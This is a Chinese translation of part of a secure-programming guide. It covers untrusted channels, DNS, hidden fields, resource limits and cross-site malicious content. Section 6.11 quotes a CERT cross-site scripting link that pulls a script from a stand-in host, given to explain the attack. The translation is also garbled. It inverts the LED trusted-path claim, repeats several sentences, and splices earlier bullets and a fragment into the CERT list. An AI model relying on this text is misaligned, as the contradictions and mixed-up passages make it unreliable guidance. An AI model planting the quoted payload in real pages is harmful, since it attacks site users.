    ## 6.8. 仅信任可信的渠道


    通常情况下，不要信任来自不可信渠道的结果。


    在大多数计算机网络中（对于整个互联网更是如此），没有任何未经认证的传输是可信的。例如，在互联网上，任意数据包可以被伪造（包括报头值），因此，除非你能对其进行认证，否则不要将这些值作为安全决策的主要标准。在某些情况下，你可以断定来自“内部”的数据包实际上是真实的，因为本地防火墙会防止此类伪造外溢，但防火墙损坏、备用路径和移动代码使得这种怀疑也变得存在。类似地，不要假设低端口号（小于
    1024）是可信的；在大多数网络中，这些请求可以被伪造，或者可以强制平台使用低号端口。


    如果你正在实现一种标准的且本质上不安全的协议（例如 ftp 和 login），请提供安全的默认值和明确的赋值。


    域名服务器（DNS）广泛应用于互联网上，用于维护计算机名称与其 IP（数字）地址之间的映射。所谓的“反向 DNS”技术可以消除一些欺骗攻击，并有助于确定主机名。然而，这种技术对于认证决策是不可信的。


    问题在于，最终 DNS 请求将发送到某个可能受攻击者控制的远程系统。因此，请将 DNS 结果视为需要验证的输入，不要信任它用于严格的访问控制。


    如果需要请求密码，请尝试建立可信路径（例如，要求在登录前按下不可伪造的按键，或显示不可伪造的模式，如闪烁 LED）。否则，一个“恶意”程序可能会创建一个“看起来像”预期密码显示的界面（例如登录界面）并拦截该密码。遗憾的是，原生的
    Linux 和大多数其他 Unix 系统对其正常登录序列没有可信路径，而且由于目前普通用户可以更改 LED，因此 LED 目前可以被用来确认可信路径。在网络上处理密码时，请在可信端点之间对其进行加密。


    任意电子邮件（包括地址的“来自”值）也可以被伪造。使用数字签名是防御许多此类攻击的方法。一种更容易被破解的方法是要求使用特殊的随机生成值进行往返邮件，但对于如加入公共邮件列表签名等低价值交易，这通常是可以接受的。


    如果你在不可信的网络上需要一个可信渠道，你需要某种密码学服务（至少是加密安全的哈希）；有关加密算法和协议的更多信息，请参阅第 10.4 节。


    注意，在任何客户端/服务器模型中（包括 CGI），服务器必须假设客户端可以修改任何值。例如，所谓的“隐藏字段”和 cookie 值可以在被 CGI 程序接收之前由客户端更改。除非采取了特殊措施，否则这些是不可信的。例如，只要服务器检查签名，就可以以客户端无法伪造的方式对隐藏字段进行签名。隐藏字段还可以还可以使用只有可信服务器才能解密的密钥进行加密（后者的这种方法是
    Kerberos 认证系统的基本思想）。InfoSec 实验室在 http://www.infoseclabs.com/mschf/mschlf.htm 对隐藏字段和加密有进一步的讨论。通常，在客户端/服务器模型中，将你关心的数据保留在服务器端会更好。同样地，不要在
    CGI 程序中依赖 HTTP_REFERER 进行认证，因为这是是由用户的浏览器（而不是网络服务器）发送的。


    `login(3)` 和 `tname(3)` 例程返回可以由本地用户控制的信息，因此不要出于安全目的信任它们。


    此问题也适用于引用其他数据的情况。例如，HTML 或 XML 允许你通过引用包含其他文件（例如 DTD 和样式表），这些文件可能存储在远程。然而，这些外部引用可能会被修改，导致用户看到的文档与预期的大不相同；样式表可能会被修改以“擦除”关键位置的词汇、破坏其外观或插入新文本。外部
    DTD 可能会被修改以防止文档的使用（通过添加破坏验证的声明）或在文档中插入不同的文本 [St. Laurent 2000]。


    ## 6.9. 使用内部一致性检查代码


    程序应该检查并确保调用参数和基本状态假设是有效的。在 C 语言中，`assert(3)` 等宏可能有助于做到这一点。


    ## 6.10. 资源自限


    在网络守护进程中，丢弃或限制过载负载。设置限制值（使用 `setrlimit(2)`）来限制将使用的资源。至少要使用 `setrlimit(2)` 禁用“core”文件的创建。例如，Linux
    默认会在程序异常失败时创建一个保存所有程序内存的 core 文件，但此类文件可能包含密码或其他敏感数据。


    ## 6.11. 防止跨站恶意内容


    某些安全程序接收来自一个不可信用户（攻击者）的数据，并将该数据传递给用户的应用程序（受害者）。如果安全程序没有保护受害者，受害者的应用程序（例如其网络浏览器）可能会以损害受害者的方式处理数据。这是使用
    HTML 或 XML 的 Web 应用程序的常见问题，该问题有多个名称，包括“跨站脚本”、“恶意 HTML 标签”和“恶意内容”。本书将把此问题称为“跨站恶意内容”，因为该问题不仅限于脚本或
    HTML，而且其跨站站的性质是根本性的。注意，此问题不仅限于脚本或 HTML，其跨站性质是根本性的。


    ### 6.11.1. 问题的解释


    让我们从简单的例子开始。有些 Web 应用程序设计为允许在预期的文本中使用 HTML 标签。如果不留预防措施，这些标签就可以被恶意用户用来攻击其他读者（例如在留言板或“评论”区域）。这并非问题的完整列举，但足以让你相信这是一个严重问题。


    大多数“讨论板”已经发现了这个问题，并且大多数在预期的帖子文本中已采取了预防措施。遗憾的是，许多应用程序开发者并没有意识到这是一个更广泛的问题。从一个用户发送到另一个用户的每个值都可能成为恶意发布的来源，即使它不是“显而易见”的情况。恶意数据可以由用户自己提供，因为用户可能被骗通过另一个站点提供数据。这里有一个来自
    CERT 的 HTML 链接示例，会导致用户向另一个站点发送恶意数据：


    ```

    <A HREF="http://example.com/comment.cgi?mycomment=<SCRIPT SRC=''http://bad-site/badfile''></SCRIPT>
    点击此处</A>

    ```


    总之，Web 应用程序在不进行检查、过滤或编码的情况下不能接受任何表单数据。在许多情况下，你无法将这些数据传回给同一个用户，因为另一个用户可能秘密提供了数据。如果允许此类材料会损害你的系统，它将使你的系统成为攻击你用户的媒介。更糟糕的是，那些攻击看起来是来自你的系统。


    ### 6.11.2. 结构与方法


    通过在正确的位置嵌入恶意 FORM 标签，入侵者可能会欺骗用户暴露敏感信息（通过修改现有表单的行为）。这并非问题的完整列举，但足以让你相信这是一个严重问题。


    CERT 在其告告中描述了这种问题方式：

    - 外部引用可能会被修改，导致用户看到的文档与预期的大不相同

    - 样式表可能会被修改以“擦除”关键位置的词汇、破坏其外观或插入新文本

    - 外部 DTD 可能会被修改以防止文档的使用（通过添加破坏验证的声明）或在文档中插入不同的文本 [St. Laurent 2000]

    - SSL 加密连接

    - 通过客户端访问受限的网站

    - 违反基于域的安全策略

    - 使网页不可读

    - 使网页使用不愉快（例如烦人的横幅）

    - 允许侵犯隐私（通过插入 Web Bug 获知谁阅读了特定页面）

    - 创建拒绝服务攻击（通过创建“无限”数量的窗口）

    - 通过插入对浏览器安全漏洞（如脚本语言或缓冲区溢出）的攻击甚至产生破坏性攻击


